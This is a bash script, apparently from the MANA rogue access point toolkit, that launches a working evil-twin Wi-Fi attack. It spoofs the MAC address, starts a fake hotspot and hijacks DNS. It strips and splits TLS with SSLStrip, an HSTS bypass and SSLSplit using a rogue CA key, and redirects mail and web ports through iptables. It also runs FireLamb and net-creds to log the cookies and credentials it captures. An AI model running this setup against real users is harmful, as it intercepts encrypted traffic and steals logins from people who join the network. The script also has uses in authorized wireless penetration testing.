#!/bin/bash

#I can haz virutal interface?
ifconfig eth0:1 10.10.10.1 netmask 255.255.255.0
ip route add 10.0.0.0/16 via 10.10.10.1

upstream=eth0
phy=eth0:1
conf=/etc/mana-toolkit/hostapd-common.conf
hostapd=/usr/lib/mana-toolkit/hostapd

hostname WRT54G
echo hostname WRT54G
sleep 2

service network-manager stop
rfkill unblock wlan

ifconfig wlan1 down
macchanger -r wlan1
ifconfig wlan1 up

sed -i "s/^interface=.*$/interface=wlan1/" $conf
$hostapd $conf&
sleep 5
ifconfig wlan1 10.0.0.1 netmask 255.255.255.0
ifconfig wlan1_1 10.0.10.1 netmask 255.255.255.0
ifconfig wlan1_2 10.0.20.1 netmask 255.255.255.0
ifconfig wlan1_3 10.0.30.1 netmask 255.255.255.0
ifconfig wlan1_4 10.0.40.1 netmask 255.255.255.0
ifconfig wlan1_5 10.0.50.1 netmask 255.255.255.0
ifconfig wlan1_6 10.0.60.1 netmask 255.255.255.0
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
route add -net 10.0.10.0 netmask 255.255.255.0 gw 10.0.10.1
route add -net 10.0.20.0 netmask 255.255.255.0 gw 10.0.20.1
route add -net 10.0.30.0 netmask 255.255.255.0 gw 10.0.30.1
route add -net 10.0.40.0 netmask 255.255.255.0 gw 10.0.40.1
route add -net 10.0.50.0 netmask 255.255.255.0 gw 10.0.50.1
route add -net 10.0.60.0 netmask 255.255.255.0 gw 10.0.60.1

dhcpd -cf /etc/mana-toolkit/dhcpd-common.conf wlan1 wlan1_1 wlan1_2 wlan1_3 wlan1_4 wlan1_5 wlan1_6

echo '1' > /proc/sys/net/ipv4/ip_forward
iptables --policy INPUT ACCEPT
iptables --policy FORWARD ACCEPT
iptables --policy OUTPUT ACCEPT
iptables -F
iptables -t nat -F
iptables -t nat -A POSTROUTING -o $upstream -j MASQUERADE
iptables -A FORWARD -i $phy -o $upstream -j ACCEPT
#iptables -t nat -A PREROUTING -i $phy -p udp --dport 53 -j DNAT --to 10.10.10.1
iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to 10.10.10.1

#SSLStrip with HSTS bypass
cd /usr/share/mana-toolkit/sslstrip-hsts/sslstrip2/
python sslstrip.py -l 10000 -a -w /var/lib/mana-toolkit/sslstrip.log.`date "+%s"`&
iptables -t nat -A PREROUTING -i eth0:1 -p tcp --destination-port 80 -j REDIRECT --to-port 10000
cd /usr/share/mana-toolkit/sslstrip-hsts/dns2proxy/
python dns2proxy.py -i eth0:1&
cd /usr/share/mana-toolkit/sslstrip-hsts/dns2proxy/

#SSLSplit
sslsplit -D -P -Z -S /var/lib/mana-toolkit/sslsplit -c /usr/share/mana-toolkit/cert/rogue-ca.pem -k /usr/share/mana-toolkit/cert/rogue-ca.key -O -l /var/lib/mana-toolkit/sslsplit-connect.log.`date "+%s"` \
 https 0.0.0.0 10443 \
 http 0.0.0.0 10080 \
 ssl 0.0.0.0 10993 \
 tcp 0.0.0.0 10143 \
 ssl 0.0.0.0 10995 \
 tcp 0.0.0.0 10110 \
 ssl 0.0.0.0 10465 \
 tcp 0.0.0.0 10025&
#iptables -t nat -A INPUT -i $phy \
 #-p tcp --destination-port 80 \
 #-j REDIRECT --to-port 10080
iptables -t nat -A PREROUTING -i $phy \
 -p tcp --destination-port 443 \
 -j REDIRECT --to-port 10443
iptables -t nat -A PREROUTING -i $phy \
 -p tcp --destination-port 143 \
 -j REDIRECT --to-port 10143
iptables -t nat -A PREROUTING -i $phy \
 -p tcp --destination-port 993 \
 -j REDIRECT --to-port 10993
iptables -t nat -A PREROUTING -i $phy \
 -p tcp --destination-port 65493 \
 -j REDIRECT --to-port 10993
iptables -t nat -A PREROUTING -i $phy \
 -p tcp --destination-port 465 \
 -j REDIRECT --to-port 10465
iptables -t nat -A PREROUTING -i $phy \
 -p tcp --destination-port 25 \
 -j REDIRECT --to-port 10025
iptables -t nat -A PREROUTING -i $phy \
 -p tcp --destination-port 995 \
 -j REDIRECT --to-port 10995
iptables -t nat -A PREROUTING -i $phy \
 -p tcp --destination-port 110 \
 -j REDIRECT --to-port 10110

# Start FireLamb
/usr/share/mana-toolkit/firelamb/firelamb.py -i $phy &

# Start net-creds
python /usr/share/mana-toolkit/net-creds/net-creds.py -i $phy > /var/lib/mana-toolkit/net-creds.log.`date "+%s"`



echo "Hit enter to kill me"
read
pkill dhcpd
pkill sslstrip
pkill sslsplit
pkill hostapd
pkill python
iptables --policy INPUT ACCEPT
iptables --policy FORWARD ACCEPT
iptables --policy OUTPUT ACCEPT
iptables -t nat -F
